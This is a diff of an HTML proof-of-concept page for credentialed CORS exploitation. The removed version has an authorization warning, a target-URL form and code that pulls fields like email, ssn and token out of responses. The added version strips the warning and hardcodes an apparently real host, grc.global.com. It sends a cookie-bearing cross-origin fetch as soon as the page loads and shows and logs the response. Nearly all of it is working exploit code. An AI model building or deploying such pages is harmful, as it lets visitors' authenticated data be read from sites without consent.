@@ -1,133 +1,34 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>Credentialed CORS PoC — Local Only</title>
-  <style>
-    body{font-family:system-ui,Arial;padding:1rem;line-height:1.4}
-    pre{white-space:pre-wrap;border:1px solid #ddd;padding:1rem;background:#f9f9f9;max-height:60vh;overflow:auto}
-    input, select{padding:.3rem;margin:.2rem 0;width:100%}
-    button{padding:.5rem 0.8rem;margin-top:.6rem}
-    .warn{color:#a00;font-weight:600}
-  </style>
-</head>
+<head><meta charset="utf-8"><title>CORS Authenticated PoC</title></head>
 <body>
-  <h2>Credentialed CORS PoC — Local Use Only</h2>
-  <p class="warn">Only run this with explicit, written authorization from the target organization. Do not host publicly. Use a dedicated browser profile logged into the authorized test account.</p>
-
-  <label>Endpoint URL:
-    <input id="endpoint" type="text" value="https://target.example.gov/protected/api">
-  </label>
-
-  <label>Mode:
-    <select id="mode">
-      <option value="cors">cors</option>
-      <option value="no-cors">no-cors</option>
-    </select>
-  </label>
-
-  <label>Credentials:
-    <select id="cred">
-      <option value="include">include (send cookies) — USE ONLY IF AUTHORIZED</option>
-      <option value="same-origin">same-origin</option>
-      <option value="omit">omit (no cookies)</option>
-    </select>
-  </label>
-
-  <button id="run">Run credentialed fetch (local only)</button>
-  <p id="status">Status: idle</p>
-  <pre id="out">Output will appear here. Check DevTools Console & Network for more details.</pre>
-
+  <h3>CORS Authenticated PoC — open DevTools (Console & Network)</h3>
+  <p id="status">Running fetch...</p>
+  <pre id="out">waiting...</pre>
 <script>
-document.getElementById('run').addEventListener('click', async () => {
-  const ENDPOINT = document.getElementById('endpoint').value.trim();
-  const MODE = document.getElementById('mode').value;
-  const CREDENTIALS = document.getElementById('cred').value;
-
-  document.getElementById('status').innerText = 'Running fetch... (check Console & Network)';
-  document.getElementById('out').innerText = 'Waiting for response... (local only)';
-
-  try {
-    const t0 = Date.now();
-    const resp = await fetch(ENDPOINT, {
-      method: 'GET',
-      mode: MODE,
-      credentials: CREDENTIALS,
-      redirect: 'follow'
-    });
-    const t1 = Date.now();
-
-    // Collect headers (local-only)
-    const headers = {};
-    resp.headers.forEach((v,k) => headers[k.toLowerCase()] = v);
-
-    // Create header summary
-    const hdrSummary = [
-      'status: ' + resp.status,
-      'access-control-allow-origin: ' + (headers['access-control-allow-origin'] || 'Not Present'),
-      'access-control-allow-credentials: ' + (headers['access-control-allow-credentials'] || 'Not Present'),
-      'access-control-allow-methods: ' + (headers['access-control-allow-methods'] || 'Not Present'),
-      'access-control-allow-headers: ' + (headers['access-control-allow-headers'] || 'Not Present'),
-      'vary: ' + (headers['vary'] || 'Not Present'),
-      'set-cookie: ' + (headers['set-cookie'] || 'Not Present')
-    ].join('\\n');
-
-    // Read body safely and try to extract common sensitive fields
-    let bodyPreview = '';
-    let parsed = null;
-    const ct = resp.headers.get('content-type') || '';
-    if (ct.includes('json')) {
-      try {
-        parsed = await resp.json();
-        bodyPreview = JSON.stringify(parsed, null, 2).slice(0, 20000);
-      } catch (e) {
-        bodyPreview = 'JSON parse error: ' + e.toString();
-      }
-    } else {
-      try {
-        const txt = await resp.text();
-        bodyPreview = txt.slice(0, 20000);
-      } catch(e){
-        bodyPreview = 'Text read error: ' + e.toString();
-      }
-    }
-
-    // Heuristic extraction — only local display
-    const extracted = {};
+const ENDPOINT = 'https://grc.global.com/login?redirect=%2F'; // replace if you find a better /api/me endpoint
+fetch(ENDPOINT, { method: 'GET', mode: 'cors', credentials: 'include' })
+  .then(async r => {
+    document.getElementById('status').innerText = 'Status: ' + r.status;
+    const ct = r.headers.get('Content-Type') || '';
+    let text;
     try {
-      if (parsed && typeof parsed === 'object') {
-        const keys = ['email','email_address','name','full_name','username','balance','account_id','phone','ssn','id','token'];
-        for (const k of keys) {
-          if (k in parsed) extracted[k] = parsed[k];
-        }
-        if (!Object.keys(extracted).length && parsed.data) {
-          const cand = parsed.data[0] || parsed.data;
-          for (const k of keys) if (cand && k in cand) extracted[k] = cand[k];
-        }
+      if (ct.includes('json')) {
+        const j = await r.json();
+        document.getElementById('out').innerText = JSON.stringify(j, null, 2);
+        console.log('PoC JSON:', j);
+      } else {
+        text = await r.text();
+        document.getElementById('out').innerText = text.slice(0,2000);
+        console.log('PoC text:', text);
       }
-    } catch (e) {
-      console.warn('extract error', e);
+    } catch(e) {
+      document.getElementById('out').innerText = 'Parse error: ' + e;
     }
-
-    document.getElementById('status').innerText = `Request finished: ${resp.status} (${t1 - t0} ms)`;
-    document.getElementById('out').innerText = [
-      '=== Header summary ===',
-      hdrSummary,
-      '',
-      '=== Extracted (local-only, heuristic) ===',
-      (Object.keys(extracted).length ? JSON.stringify(extracted, null, 2) : 'No common sensitive keys found by heuristic'),
-      '',
-      '=== Body preview (trimmed) ===',
-      bodyPreview
-    ].join('\\n\\n');
-
-    console.log('Local PoC result', {status: resp.status, headers, extracted, preview: bodyPreview.slice(0,2000)});
-  } catch (err) {
-    document.getElementById('status').innerText = 'Fetch failed: ' + err;
-    document.getElementById('out').innerText = 'Error (see console): ' + err;
-    console.error('PoC fetch error', err);
-  }
-});
+  }).catch(e => {
+    document.getElementById('status').innerText = 'Fetch failed: ' + e;
+    document.getElementById('out').innerText = 'fetch error: ' + e;
+  });
 </script>
 </body>
 </html>
